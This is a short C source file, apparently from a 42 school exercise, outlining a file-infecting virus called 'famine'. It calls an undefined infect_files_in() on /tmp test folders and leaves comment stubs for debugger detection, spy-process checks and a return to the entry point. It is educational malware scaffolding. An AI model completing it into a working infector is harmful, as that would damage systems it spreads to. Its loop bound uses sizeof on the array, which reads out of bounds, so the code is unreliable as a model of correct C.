/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 00:21:46 by agrumbac          #+#    #+#             */
/*   Updated: 2019/06/04 03:53:01 by agrumbac         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

inline void	virus()
{
	const char *playgrounds[] =
	{
		"/tmp/test",
		"/tmp/test2"
	};

	for (size_t i = 0; i < sizeof(playgrounds); i++)
	{
		infect_files_in(playgrounds[i]);
	}
}

void		famine()
{
	// check debugger
	// check spy process
	virus();
	// return to entry
}
